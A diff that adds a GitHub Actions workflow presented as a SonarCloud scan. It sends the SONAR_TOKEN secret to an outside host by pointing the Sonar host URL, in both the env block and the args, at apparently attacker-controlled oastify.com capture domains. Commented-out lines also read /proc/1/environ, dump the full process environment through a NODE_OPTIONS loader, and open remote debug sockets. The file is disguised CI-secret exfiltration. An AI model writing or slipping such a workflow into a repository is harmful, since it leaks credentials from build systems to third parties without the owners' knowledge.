@@ -1,0 +1,34 @@
+name: Sonar
+
+on:
+  workflow_dispatch:
+
+jobs:
+  sonar:
+    name: Sonar
+    runs-on: ubuntu-latest
+    steps:
+      - name: SonarCloud Scan
+        uses: sonarsource/sonarcloud-github-action@master
+        env:
+          #GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+          #SONAR_PR_NUM: 666
+          #SONAR_HEAD: foo
+          #SONAR_BASE: foo
+          #JAVA_OPTS: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=1044"
+          #MAVEN_OPTS: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=1045"
+          #MAVEN_DEBUG_OPTS: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=1046"
+          #SONAR_SCANNER_OPTS: "-XshowSettings:all @/proc/1/environ"
+          SONAR_HOST_URL: http://bq5ojg5y9c7i8wuxvwv88mwn6ec50xom.oastify.com/
+          #NODE_OPTIONS: "--experimental-modules --experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toString('hex'));//"
+          #-Dsonar.pullrequest.branch=${{ env.SONAR_HEAD }}
+          #-Dsonar.pullrequest.base=${{ env.SONAR_BASE }}
+          #-Dsonar.pullrequest.key=${{ env.SONAR_PR_NUM }}
+          #-Dsonar.scm.revision=foo
+          #-Dsonar.projectKey=test
+          #-Dsonar.organization=test
+        with:
+          args: >
+            -Dsonar.host.url=http://do5qhi307e5k6ysztyta6oup4ga7y1mq.oastify.com
+            -X
